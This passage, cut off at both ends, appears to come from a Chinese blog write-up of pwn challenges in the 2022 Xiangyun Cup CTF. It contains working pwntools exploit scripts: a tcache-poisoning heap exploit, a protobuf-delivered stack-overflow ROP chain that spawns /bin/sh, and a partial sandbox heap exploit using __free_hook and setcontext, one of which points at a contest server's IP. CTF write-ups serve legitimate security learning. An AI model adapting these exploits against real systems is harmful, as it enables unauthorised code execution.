class="hljs-number">4</span>,<span class="hljs-number">0x10</span>)<br>    add(<span class="hljs-number">5</span>,<span class="hljs-number">0x10</span>)<br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>)<span class="hljs-comment">#unsortbin</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        delete(<span class="hljs-number">1</span>)<br>        edit(<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<span class="hljs-comment">#prepare to use get unsortbin main_arena</span><br><br>    delete(<span class="hljs-number">3</span>)<br>    delete(<span class="hljs-number">4</span>)<br>    edit(<span class="hljs-number">4</span>,p8(<span class="hljs-number">0x10</span>))<span class="hljs-comment">#tcache poison to heap 2</span><br><br>    add(<span class="hljs-number">8</span>,<span class="hljs-number">0x10</span>)<br>    add(<span class="hljs-number">9</span>,<span class="hljs-number">0x10</span>)<span class="hljs-comment">#now overlap 2=9</span><br>    edit(<span class="hljs-number">9</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x41</span>))<br>    delete(<span class="hljs-number">2</span>)<br><br>    add(<span class="hljs-number">10</span>,<span class="hljs-number">0x40</span>)<br>    edit(<span class="hljs-number">9</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x51</span>))<br>    delete(<span class="hljs-number">10</span>)<br>    delete(<span class="hljs-number">2</span>)<br><br>    edit(<span class="hljs-number">9</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xa1</span>))<br>    delete(<span class="hljs-number">2</span>)<br>    edit(<span class="hljs-number">2</span>,p16(<span class="hljs-number">0xe760</span>))<br><br>    add(<span class="hljs-number">11</span>,<span class="hljs-number">0x40</span>)<br>    add(<span class="hljs-number">12</span>,<span class="hljs-number">0x40</span>)<br>    edit(<span class="hljs-number">12</span>,p64(<span class="hljs-number">0xfbad1800</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0x577777777777</span>))<br><br>    edit(<span class="hljs-number">9</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x41</span>))<br>    edit(<span class="hljs-number">2</span>,p16(<span class="hljs-number">0xe780</span>-<span class="hljs-number">0x18</span>))<br>    add(<span class="hljs-number">13</span>,<span class="hljs-number">0x30</span>)<br>    add(<span class="hljs-number">14</span>,<span class="hljs-number">0x30</span>)<br><br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;flag&#123;&#x27;</span>)<br>    s=rc(<span class="hljs-number">0x50</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag&#123;&#x27;</span>+s)<br>    r.interactive()<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r=process(<span class="hljs-string">&#x27;./leak&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            pwn()<br>        <span class="hljs-keyword">except</span>:<br>            r.close()<br></code></pre></td></tr></table></figure><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/leakgetshell.png" alt="leakgetshell"></p><h2 id="protocol">protocol</h2><p>没做过这种类型的题，真的是一脸懵逼😨,参考-不知从哪来的一份wp</p><p><strong><a href="https://developers.google.com/protocol-buffers/">Protobuf</a>是由Google开发的一种序列化格式</strong>，用于越来越多的Android，Web，桌面和更多应用程序。它由一种<strong>用于声明数据结构的语言</strong>组成，然后根据目标实现将其编译为代码或另一种结构。</p><h3 id="0x01程序分析：">0x01程序分析：</h3><p>这题是photobuf文件，</p><p>先ida跳转到指定函数，因为去了符号表，加签名文件，可以获得更多信息</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/photo1.png" alt="photo1"></p><p>发现漏洞存在于这两个strcpy，存在栈溢出</p><p>偏移0x148或0x248</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/@GXH%7D4T65URK%7B7GJQQL%7BMKR.png" alt="img"></p><p>但由于用的是strcpy，遇到\x00会截断，并且在末尾会加上\x00</p><p>程序会一直循环，如果我们要用栈溢出去rop的话可以从后往前构造</p><p>但首先我们得正确与程序进行交互</p><h3 id="0x02安装pbkt">0x02安装pbkt</h3><p>用工具帮助我们逆向</p><blockquote><p>pbtk - 逆向工程Protobuf应用程序</p></blockquote><p>我选择在ubuntu20.04上装</p><p>报了很多错</p><p>最后我更新pip3到最新版本，下面代码openjdk-9我换成openjdk-11，</p><p>git clone我换成去github上下载zip到主机，再解压放到虚拟机里，</p><p>运行./gui.py成功搞定</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/pbkt%E5%AE%89%E8%A3%85.png" alt="pbkt安装"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-client</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/marin-m/pbtk</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> pbtk</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">./gui.py</span><br></code></pre></td></tr></table></figure><h3 id="0x03得到ctf-proto">0x03得到ctf.proto</h3><p>直接点击step1</p><p>然后选择第一个也就是二进制文件格式的</p><p>找到protocol文件，双击，就有了ctf.proto文件</p><p>我们可以看到，文件存在这个位置</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/ctfproto1.png" alt="ctfproto1"></p><p>我拷贝到桌面</p><p><code>cp -r ./ctf.proto ~/Desktop</code></p><h3 id="0x04protoc编译popto文件">0x04protoc编译popto文件</h3><p>安装谷歌的protoc</p><p><code>sudo apt install python3-protobuf protobuf-compiler libprotobuf17 libprotobuf-dev</code></p><p>输入以下命令，编译出ctf_pb2.py文件</p><p><code>protoc --python_out=./ ./ctf.proto</code></p><p>我们可以引用</p><p><code>import ctf_pb2</code>到脚本中</p><p>它的结构为</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/photo2.png" alt="photo2"></p><p>可以这么用如下代码使用，用.SerializeToString()方法序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">d=ctf_pb2.pwn()<br>d.username=pd<br>d.password=<span class="hljs-string">b&#x27;p&#x27;</span><br>strs=d.SerializeToString()<br>r.sendafter(<span class="hljs-string">b&#x27;Login: &#x27;</span>,strs)<br></code></pre></td></tr></table></figure><h3 id="0x05exp">0x05exp</h3><p>大体逻辑就是栈溢出从后往前rop造了execve(bss,0,0) 和read(0,bss,7),写入/bin/sh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ctf_pb2<br>r = process(<span class="hljs-string">&#x27;protocol&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./protocol&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><br>pop_rdi=<span class="hljs-number">0x0000000000404982</span> <span class="hljs-comment"># pop rdi ; ret</span><br>pop_rsi=<span class="hljs-number">0x0000000000588bbe</span> <span class="hljs-comment"># pop rsi ; ret</span><br>pop_rdx=<span class="hljs-number">0x000000000040454f</span> <span class="hljs-comment"># pop rdx ; ret</span><br>pop_rax=<span class="hljs-number">0x00000000005bdb8a</span> <span class="hljs-comment"># pop rax ; ret</span><br><span class="hljs-comment">#syscall=0x0000000000403c99 # syscall</span><br>syscall=<span class="hljs-built_in">next</span>(elf.search(asm(<span class="hljs-string">&#x27;syscall\nret&#x27;</span>)))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(syscall))<br><span class="hljs-comment">#syscall=0x68f0a4</span><br>bss=<span class="hljs-number">0x81A2E0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">pd</span>):<br>    d=ctf_pb2.pwn()<br>    d.username=pd<br>    d.password=<span class="hljs-string">b&#x27;p&#x27;</span><br>    strs=d.SerializeToString()<br>    r.sendafter(<span class="hljs-string">b&#x27;Login: &#x27;</span>,strs)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gadget</span>(<span class="hljs-params">off,val,zero_byte=<span class="hljs-number">5</span></span>):<br>    <span class="hljs-keyword">if</span> val == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            s(<span class="hljs-string">b&#x27;a&#x27;</span>*(off+<span class="hljs-number">7</span>-i))<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(zero_byte):<br>        s(<span class="hljs-string">b&#x27;a&#x27;</span>*(off+<span class="hljs-number">7</span>-i))<br>    s(<span class="hljs-string">b&#x27;a&#x27;</span>*off+p64(val)[:(<span class="hljs-number">8</span>-zero_byte)])<br><br>gadget(<span class="hljs-number">0x1d0</span>,syscall)<br>gadget(<span class="hljs-number">0x1c8</span>,<span class="hljs-number">0</span>)<br>gadget(<span class="hljs-number">0x1c0</span>,pop_rdx)<br>gadget(<span class="hljs-number">0x1b8</span>,<span class="hljs-number">0</span>)<br>gadget(<span class="hljs-number">0x1b0</span>,pop_rsi)<br>gadget(<span class="hljs-number">0x1a8</span>,bss)<br>gadget(<span class="hljs-number">0x1a0</span>,pop_rdi)<br>gadget(<span class="hljs-number">0x198</span>,<span class="hljs-number">59</span>,<span class="hljs-number">7</span>)<br>gadget(<span class="hljs-number">0x190</span>,pop_rax)<br><br>gadget(<span class="hljs-number">0x188</span>,syscall)<br>gadget(<span class="hljs-number">0x180</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>)<br>gadget(<span class="hljs-number">0x178</span>,pop_rdx)<br>gadget(<span class="hljs-number">0x170</span>,bss)<br>gadget(<span class="hljs-number">0x168</span>,pop_rsi)<br>gadget(<span class="hljs-number">0x160</span>,<span class="hljs-number">0</span>)<br>gadget(<span class="hljs-number">0x158</span>,pop_rdi)<br>gadget(<span class="hljs-number">0x150</span>,<span class="hljs-number">0</span>)<br>gadget(<span class="hljs-number">0x148</span>,pop_rax)<br><br>d = ctf_pb2.pwn()<br>d.username = p32(<span class="hljs-number">0xdead</span>)<br>d.password = p32(<span class="hljs-number">0xbeef</span>)<br><span class="hljs-built_in">print</span>(d.SerializeToString())<br>strs=d.SerializeToString()<br><span class="hljs-comment">#debug()</span><br><span class="hljs-built_in">print</span>(strs)<br>r.sendafter(<span class="hljs-string">b&#x27;Login: &#x27;</span>,strs)<br><span class="hljs-comment">#debug()</span><br>sleep(<span class="hljs-number">1</span>) <span class="hljs-comment">#need to sleep ,or might be EOF</span><br>r.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="sandboxheap">sandboxheap</h2><p>open与 （read和write）不能同时使用</p><p>用0x10000的功能去使用open</p><p>接着alarm软中断，</p><p>再用read，write就读出flag了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./sandboxheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    <span class="hljs-comment">#r = process(local_file)</span><br>    r = process(argv = [<span class="hljs-string">&#x27;./sandbox&#x27;</span>, local_file])<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;101.201.71.136&#x27;</span>, <span class="hljs-number">23712</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims          :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-comment">#------------------------------</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<span class="hljs-comment">#0~6</span><br>    add(i,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x28</span>)<br><br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">12</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-number">0x28</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br>edit(<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">0x38</span>+<span class="hljs-string">&#x27;0&#x27;</span>)<br><br>edit(<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">4</span>)<br><br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">12</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0xa0</span>)<br>show(<span class="hljs-number">10</span>)<br>libc_base=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span><br>info(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]+libc_base<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]+libc_base<br>info(<span class="hljs-string">&#x27;free_hook&#x27;</span>,free_hook)<br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x18</span>)<span class="hljs-comment">#10</span><br>delete(<span class="hljs-number">14</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">intToBit</span>(<span class="hljs-params">n</span>):<br>        bits = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> n&gt;<span class="hljs-number">0</span>:<br>            bits = <span class="hljs-built_in">str</span>(n%<span class="hljs-number">2</span>) + bits<br>            n = n//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(bits)!=<span class="hljs-number">8</span>:<br>            bits = <span class="hljs-string">&quot;0&quot;</span>+bits<br>        <span class="hljs-keyword">return</span> bits<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bitToInt</span>(<span class="hljs-params">n</span>):<br>        <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(n)):<br>            <span class="hljs-built_in">sum</span> += <span class="hljs-built_in">int</span>(n[i])*<span class="hljs-number">2</span>**(<span class="hljs-built_in">len</span>(n)-i-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverseBits</span>(<span class="hljs-params">n</span>):<br>        <span class="hljs-keyword">if</span> n==<span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>        bits = intToBit(n)<br>        <span class="hljs-keyword">return</span> bitToInt(bits[::-<span class="hljs-number">1</span>])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">n</span>):<br>    n8=(n/(<span class="hljs-number">0x100000000000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n7=(n/(<span class="hljs-number">0x1000000000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n6=(n/(<span class="hljs-number">0x10000000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n5=(n/(<span class="hljs-number">0x100000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n4=(n/(<span class="hljs-number">0x1000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n3=(n/(<span class="hljs-number">0x10000</span>))&amp;<span class="hljs-number">0xff</span><br>    n2=(n/(<span class="hljs-number">0x100</span>))&amp;<span class="hljs-number">0xff</span><br>    n1=(n/<span class="hljs-number">0x1</span>)&amp;<span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> ((<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n1))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n2))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n3))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n4))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n5))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n6))[<span class="hljs-number">2</span>:])).rjust(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;0&#x27;</span>)+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n7))[<span class="hljs-number">2</span>:])).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>)+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n8))[<span class="hljs-number">2</span>:])).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))<br><br><span class="hljs-comment">#print(hex(reverseBits(0x7f)))</span><br>setcontext=libc_base+libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]+<span class="hljs-number">53</span><br><br><br>edit(<span class="hljs-number">10</span>,change(<span class="hljs-number">0x6161616161616161</span>))<br>show(<span class="hljs-number">10</span>)<br>ru(<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>heap_base=uu64(rc(<span class="hljs-number">6</span>))-<span class="hljs-number">0xa10</span>+<span class="hljs-number">0xa00</span><br>info(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><br>edit(<span class="hljs-number">10</span>,change(free_hook))<br><br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x18</span>)<br><br><br>add(<span class="hljs-number">15</span>,<span class="hljs-number">0x18</span>)<br><br>edit(<span class="hljs-number">15</span>,change(setcontext)  ) <br>pop_rdi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>)))<br>pop_rsi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>)))<br>pop_rdx = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop 